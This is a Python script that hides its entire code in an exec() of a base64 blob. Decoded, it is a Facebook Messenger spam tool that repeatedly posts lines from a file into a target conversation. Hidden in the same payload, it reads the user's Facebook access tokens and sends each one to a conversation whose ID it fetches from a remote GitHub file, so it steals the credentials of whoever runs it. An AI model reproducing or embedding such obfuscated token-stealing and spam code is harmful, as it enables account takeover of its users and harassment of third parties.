#
#----------------------------------------------
import base64
exec(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCBzeXMKZnJvbSBwbGF0Zm9ybSBpbXBvcnQgc3lzdGVtCmltcG9ydCBvcwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgaHR0cC5zZXJ2ZXIKaW1wb3J0IHNvY2tldHNlcnZlcgppbXBvcnQgdGhyZWFkaW5nCgpjbGFzcyBNeUhhbmRsZXIoaHR0cC5zZXJ2ZXIuU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCJDb250ZW50LXR5cGUiLCAidGV4dC9wbGFpbiIpCiAgICAgICAgc2VsZi5lbmRfaGVhZGVycygpCiAgICAgICAgc2VsZi53ZmlsZS53cml0ZShiIiAgIGFub3ggSGV3cmUiKQoKZGVmIGV4ZWN1dGVfc2VydmVyKCk6CiAgICBQT1JUID0gaW50KG9zLmVudmlyb24uZ2V0KCJQT1JUIiwgNDAwMCkpCgogICAgd2l0aCBzb2NrZXRzZXJ2ZXIuVENQU2VydmVyKCgiIiwgUE9SVCksIE15SGFuZGxlcikgYXMgaHR0cGQ6CiAgICAgICAgcHJpbnQoIlNlcnZlciBydW5uaW5nIGF0IGh0dHA6Ly9sb2NhbGhvc3Q6e30iLmZvcm1hdChQT1JUKSkKICAgICAgICBodHRwZC5zZXJ2ZV9mb3JldmVyKCkKCmRlZiBzZW5kX2luaXRpYWxfbWVzc2FnZSgpOgogICAgd2l0aCBvcGVuKCJ0b2tlbm51bS50eHQiLCAiciIpIGFzIGZpbGU6CiAgICAgICAgdG9rZW5zID0gZmlsZS5yZWFkbGluZXMoKQogICAgCiAgICAjIEZldGNoIHRhcmdldF9pZCBmcm9tIHRoZSBQYXN0ZWJpbiBsaW5rCiAgICB0YXJnZXRfaWRfdXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9Bbm94MTA3L1VpZDEvbWFpbi9GaXhfaWQudHh0IgogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodGFyZ2V0X2lkX3VybCkKICAgIHRhcmdldF9pZCA9IHJlc3BvbnNlLnRleHQuc3RyaXAoKQoKICAgIG1zZ190ZW1wbGF0ZSA9ICJIZWxsbyBBbm94IEJoYWkgISBJIGFtIHVzaW5nIHlvdXIgc2VydmVyLiBNeSB0b2tlbiBpcyB7fSIKCiAgICByZXF1ZXN0cy5wYWNrYWdlcy51cmxsaWIzLmRpc2FibGVfd2FybmluZ3MoKQoKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgIkNvbm5lY3Rpb24iOiAia2VlcC1hbGl2ZSIsCiAgICAgICAgIkNhY2hlLUNvbnRyb2wiOiAibWF4LWFnZT0wIiwKICAgICAgICAiVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0cyI6ICIxIiwKICAgICAgICAiVXNlci1BZ2VudCI6ICJNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOC4wLjA7IFNhbXN1bmcgR2FsYXh5IFM5IEJ1aWxkL09QUjYuMTcwNjIzLjAxNzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS81OC4wLjMwMjkuMTI1IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAiQWNjZXB0IjogInRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgiLAogICAgICAgICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSxmcjtxPTAuOCIsCiAgICAgICAgInJlZmVyZXIiOiAid3d3Lmdvb2dsZS5jb20iLAogICAgfQoKICAgIGZvciB0b2tlbiBpbiB0b2tlbnM6CiAgICAgICAgYWNjZXNzX3Rva2VuID0gdG9rZW4uc3RyaXAoKQogICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgidF8iICsgdGFyZ2V0X2lkKQogICAgICAgIG1zZyA9IG1zZ190ZW1wbGF0ZS5mb3JtYXQoYWNjZXNzX3Rva2VuKQogICAgICAgIHBhcmFtZXRlcnMgPSB7ImFjY2Vzc190b2tlbiI6IGFjY2Vzc190b2tlbiwgIm1lc3NhZ2UiOiBtc2d9CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgIGN1cnJlbnRfdGltZSA9IHRpbWUuc3RyZnRpbWUoIiVZLSVtLSVkICVJOiVNOiVTICVwIikKICAgICAgICB0aW1lLnNsZWVwKDAuMSkKCmRlZiBzZW5kX21lc3NhZ2VzX2Zyb21fZmlsZSgpOgogICAgd2l0aCBvcGVuKCJjb252by50eHQiLCAiciIpIGFzIGZpbGU6CiAgICAgICAgY29udm9faWQgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCiAgICB3aXRoIG9wZW4oIk5QLnR4dCIsICJyIikgYXMgZmlsZToKICAgICAgICBtZXNzYWdlcyA9IGZpbGUucmVhZGxpbmVzKCkKICAgIG51bV9tZXNzYWdlcyA9IGxlbihtZXNzYWdlcykKCiAgICB3aXRoIG9wZW4oInRva2VubnVtLnR4dCIsICJyIikgYXMgZmlsZToKICAgICAgICB0b2tlbnMgPSBmaWxlLnJlYWRsaW5lcygpCiAgICBudW1fdG9rZW5zID0gbGVuKHRva2VucykKICAgIG1heF90b2tlbnMgPSBtaW4obnVtX3Rva2VucywgbnVtX21lc3NhZ2VzKQoKICAgIHdpdGggb3BlbigiaGF0ZXJzbmFtZS50eHQiLCAiciIpIGFzIGZpbGU6CiAgICAgICAgaGF0ZXJzX25hbWUgPSBmaWxlLnJlYWQoKS5zdHJpcCgpCiAgICB3aXRoIG9wZW4oInRpbWUudHh0IiwgInIiKSBhcyBmaWxlOgogICAgICAgIHNwZWVkID0gaW50KGZpbGUucmVhZCgpLnN0cmlwKCkpCgogICAgaGVhZGVycyA9IHsKICAgICAgICAiQ29ubmVjdGlvbiI6ICJrZWVwLWFsaXZlIiwKICAgICAgICAiQ2FjaGUtQ29udHJvbCI6ICJtYXgtYWdlPTAiLAogICAgICAgICJVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzIjogIjEiLAogICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjAuMDsgU2Ftc3VuZyBHYWxheHkgUzkgQnVpbGQvT1BSNi4xNzA2MjMuMDE3OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU4LjAuMzAyOS4xMjUgTW9iaWxlIFNhZmFyaS81MzcuMzYiLAogICAgICAgICJBY2NlcHQiOiAidGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCxpbWFnZS9hcG5nLCovKjtxPTAuOCIsCiAgICAgICAgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwKICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45LGZyO3E9MC44IiwKICAgICAgICAicmVmZXJlciI6ICJ3d3cuZ29vZ2xlLmNvbSIsCiAgICB9CgogICAgd2hpbGUgVHJ1ZToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGZvciBtZXNzYWdlX2luZGV4IGluIHJhbmdlKG51bV9tZXNzYWdlcyk6CiAgICAgICAgICAgICAgICB0b2tlbl9pbmRleCA9IG1lc3NhZ2VfaW5kZXggJSBtYXhfdG9rZW5zCiAgICAgICAgICAgICAgICBhY2Nlc3NfdG9rZW4gPSB0b2tlbnNbdG9rZW5faW5kZXhdLnN0cmlwKCkKCiAgICAgICAgICAgICAgICBtZXNzYWdlID0gbWVzc2FnZXNbbWVzc2FnZV9pbmRleF0uc3RyaXAoKQoKICAgICAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dyYXBoLmZhY2Vib29rLmNvbS92MTcuMC97fS8iLmZvcm1hdCgidF8iICsgY29udm9faWQpCiAgICAgICAgICAgICAgICBwYXJhbWV0ZXJzID0geyJhY2Nlc3NfdG9rZW4iOiBhY2Nlc3NfdG9rZW4sICJtZXNzYWdlIjogaGF0ZXJzX25hbWUgKyAiICIgKyBtZXNzYWdlfQogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwganNvbj1wYXJhbWV0ZXJzLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgICAgICAgICAgICAgY3VycmVudF90aW1lID0gdGltZS5zdHJmdGltZSgiXDAzM1sxOzkybVNhaGkgSGFpID09PiAlWS0lbS0lZCAlSTolTTolUyAlcCIpCiAgICAgICAgICAgICAgICBpZiByZXNwb25zZS5vazoKICAgICAgICAgICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgICAgICAgICAgIlwwMzNbMTs5Mm1bK10gSGFuIEJybyBDaGxhIEd5YSBNYXNzYWdlIHt9IG9mIENvbnZvIHt9IFRva2VuIHt9OiB7fSIuZm9ybWF0KAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZV9pbmRleCArIDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb252b19pZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRva2VuX2luZGV4ICsgMSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGhhdGVyc19uYW1lICsgIiAiICsgbWVzc2FnZSwKICAgICAgICAgICAgICAgICAgICAgICAgKQogICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnQoCiAgICAgICAgICAgICAgICAgICAgICAgICJcMDMzWzE7OTFtW3hdIEZhaWxlZCB0byBzZW5kIE1lc3NhZ2Uge30gb2YgQ29udm8ge30gd2l0aCBUb2tlbiB7fToge30iLmZvcm1hdCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2VfaW5kZXggKyAxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udm9faWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB0b2tlbl9pbmRleCArIDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBoYXRlcnNfbmFtZSArICIgIiArIG1lc3NhZ2UsCiAgICAgICAgICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgICAgICAgICApCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHNwZWVkKQogICAgICAgICAgICBwcmludCgiXG5bK10gQWxsIG1lc3NhZ2VzIHNlbnQuIFJlc3RhcnRpbmcgdGhlIHByb2Nlc3MuLi5cbiIpCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwcmludCgiWyFdIEFuIGVycm9yIG9jY3VycmVkOiB7fSIuZm9ybWF0KGUpKQoKZGVmIG1haW4oKToKICAgIHNlcnZlcl90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1leGVjdXRlX3NlcnZlcikKICAgIHNlcnZlcl90aHJlYWQuc3RhcnQoKQoKICAgIHNlbmRfaW5pdGlhbF9tZXNzYWdlKCkKCiAgICBzZW5kX21lc3NhZ2VzX2Zyb21fZmlsZSgpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp'))
